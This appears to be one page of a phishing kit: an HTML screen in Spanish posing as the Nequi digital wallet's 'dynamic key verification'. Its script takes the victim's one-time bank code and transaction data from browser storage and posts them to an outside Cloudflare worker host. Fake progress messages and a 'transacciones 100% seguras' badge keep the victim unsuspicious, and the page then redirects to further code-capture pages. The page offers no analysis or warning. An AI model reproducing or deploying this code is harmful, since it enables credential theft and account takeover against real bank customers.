<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Verificando Din√°mica</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
  body {
    margin: 0;
    background: #FFFFFF;
    font-family: 'Inter', sans-serif;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  .header {
    width: 100%;
    background: #2E0039;
    padding: 15px 20px;
    color: white;
    font-size: 20px;
    font-weight: 700;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .container {
    padding: 40px 20px;
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
  }

  .loader {
    width: 60px;
    height: 60px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #2E0039;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 25px;
  }

  .title {
    font-size: 24px;
    font-weight: 700;
    color: #2E0039;
    margin-bottom: 15px;
  }

  .subtitle {
    font-size: 16px;
    color: #666;
    margin-bottom: 25px;
    line-height: 1.5;
  }

  .progress-container {
    width: 100%;
    max-width: 300px;
    background: #f0f0f0;
    border-radius: 10px;
    margin: 20px 0;
    overflow: hidden;
  }

  .progress-bar {
    height: 6px;
    background: linear-gradient(90deg, #2E0039, #da0081);
    width: 0%;
    transition: width 0.3s ease;
    border-radius: 10px;
  }

  .status-message {
    font-size: 14px;
    color: #666;
    margin: 15px 0;
    min-height: 40px;
  }

  .success-icon {
    font-size: 50px;
    margin-bottom: 20px;
    color: #00C853;
  }

  .error-icon {
    font-size: 50px;
    margin-bottom: 20px;
    color: #ff4444;
  }

  .info-box {
    background: #F9F3FF;
    border-radius: 12px;
    padding: 20px;
    margin: 20px 0;
    border-left: 4px solid #2E0039;
    max-width: 400px;
    text-align: left;
  }

  .info-box h3 {
    color: #2E0039;
    margin-bottom: 10px;
    font-size: 16px;
  }

  .info-box p {
    color: #666;
    font-size: 14px;
    line-height: 1.4;
    margin: 5px 0;
  }

  .footer {
    background: #2E0039;
    color: white;
    padding: 25px 20px;
    text-align: center;
    margin-top: auto;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  .security-badge {
    background: rgba(255,255,255,0.1);
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 12px;
    display: inline-block;
    margin-top: 15px;
  }
</style>
</head>
<body>

<div class="header">
  <span>‚Üê</span> Verificaci√≥n de Clave Din√°mica
</div>

<div class="container">
  <div id="loader" class="loader"></div>

  <div id="successIcon" class="success-icon" style="display: none;">‚úÖ</div>
  <div id="errorIcon" class="error-icon" style="display: none;">‚ùå</div>

  <div class="title" id="mainTitle">Verificando tu clave din√°mica</div>

  <div class="subtitle" id="subTitle">
    Estamos validando la clave de 6 d√≠gitos que ingresaste...
  </div>

  <div class="progress-container">
    <div id="progressBar" class="progress-bar"></div>
  </div>

  <div class="status-message" id="statusMessage">
    Iniciando proceso de verificaci√≥n...
  </div>

  <div class="info-box" id="infoBox" style="display: none;">
    <h3>üìã Informaci√≥n de la transacci√≥n</h3>
    <p><strong>ID:</strong> <span id="transactionId">Cargando...</span></p>
    <p><strong>Clave:</strong> <span id="dinamicaCode">******</span></p>
    <p><strong>Hora:</strong> <span id="timestamp">Cargando...</span></p>
  </div>
</div>

<div class="footer">
  <div class="footer-content">
    <div class="footer-logo" style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px;">
      <div style="background: white; color: #2E0039; width: 25px; height: 25px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px;">NQ</div>
      Nequi
    </div>
    <div style="font-size: 13px; opacity: 0.9; margin-bottom: 12px;">
      Tu billetera digital m√°s f√°cil, m√°s r√°pida y m√°s segura
    </div>
    <div class="security-badge">
      üîí Transacciones 100% seguras
    </div>
    <div style="font-size: 11px; opacity: 0.7; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 12px; margin-top: 12px;">
      &copy; 2024 Nequi. Todos los derechos reservados.
    </div>
  </div>
</div>

<script>
const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";

document.addEventListener('DOMContentLoaded', async function() {
  const loader = document.getElementById('loader');
  const successIcon = document.getElementById('successIcon');
  const errorIcon = document.getElementById('errorIcon');
  const mainTitle = document.getElementById('mainTitle');
  const subTitle = document.getElementById('subTitle');
  const progressBar = document.getElementById('progressBar');
  const statusMessage = document.getElementById('statusMessage');
  const infoBox = document.getElementById('infoBox');
  const transactionIdElement = document.getElementById('transactionId');
  const dinamicaCodeElement = document.getElementById('dinamicaCode');
  const timestampElement = document.getElementById('timestamp');

  let progress = 0;
  let transactionId = '';

  // Funci√≥n para actualizar progreso
  function updateProgress(percentage, message) {
    progress = percentage;
    progressBar.style.width = percentage + '%';
    if (message) {
      statusMessage.textContent = message;
    }
  }

  // Funci√≥n para mostrar √©xito
  function showSuccess(message) {
    loader.style.display = 'none';
    successIcon.style.display = 'block';
    mainTitle.textContent = '¬°Clave Verificada!';
    subTitle.textContent = message || 'Tu clave din√°mica ha sido validada correctamente.';
    updateProgress(100, 'Proceso completado exitosamente');
  }

  // Funci√≥n para mostrar error
  function showError(message) {
    loader.style.display = 'none';
    errorIcon.style.display = 'block';
    mainTitle.textContent = 'Error en la Verificaci√≥n';
    subTitle.textContent = message || 'Ha ocurrido un error al verificar tu clave.';
    updateProgress(100, 'Error en el proceso');
  }

  try {
    // Obtener datos del localStorage
    const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
    const bancoldina = localStorage.getItem('bancoldina');

    if (!bancoldata || !bancoldina) {
      showError('No se encontraron los datos necesarios para la verificaci√≥n.');
      setTimeout(() => {
        window.location.href = 'index.html';
      }, 4000);
      return;
    }

    transactionId = bancoldata.transactionId;
    const dinamicaCode = bancoldina;

    // Mostrar informaci√≥n de la transacci√≥n
    transactionIdElement.textContent = transactionId;
    dinamicaCodeElement.textContent = dinamicaCode;
    timestampElement.textContent = new Date().toLocaleString('es-ES');
    infoBox.style.display = 'block';

    updateProgress(20, 'Preparando env√≠o de datos...');

    // Simular proceso de verificaci√≥n
    setTimeout(() => {
      updateProgress(40, 'Conectando con el servidor...');
    }, 1000);

    setTimeout(() => {
      updateProgress(60, 'Enviando clave din√°mica...');
    }, 2000);

    // Enviar c√≥digo OTP al worker
    setTimeout(async () => {
      try {
        updateProgress(80, 'Validando seguridad...');

        const response = await fetch(`${WORKER_URL}/otp-code`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            transactionId: transactionId,
            otp: dinamicaCode,
            tipo: 'dinamica'
          })
        });

        const result = await response.json();

        if (result.ok) {
          updateProgress(95, 'Clave verificada correctamente');

          setTimeout(() => {
            showSuccess('Tu clave din√°mica ha sido registrada exitosamente.');

            // Redirigir despu√©s de mostrar √©xito
            setTimeout(() => {
              window.location.href = 'index-otp.html';
            }, 3000);
          }, 1000);

        } else {
          throw new Error(result.error || 'Error en la verificaci√≥n');
        }

      } catch (error) {
        console.error('Error:', error);
        showError('Error de conexi√≥n. Por favor intenta nuevamente.');

        setTimeout(() => {
          window.location.href = 'cel-dina.html';
        }, 4000);
      }
    }, 3000);

  } catch (error) {
    console.error('Error general:', error);
    showError('Error interno del sistema.');

    setTimeout(() => {
      window.location.href = 'index.html';
    }, 4000);
  }

  // Timeout de seguridad
  setTimeout(() => {
    if (progress < 100) {
      showError('Tiempo de espera agotado. Por favor intenta nuevamente.');
      setTimeout(() => {
        window.location.href = 'cel-dina.html';
      }, 3000);
    }
  }, 30000); // 30 segundos m√°ximo
});
</script>

</body>
</html>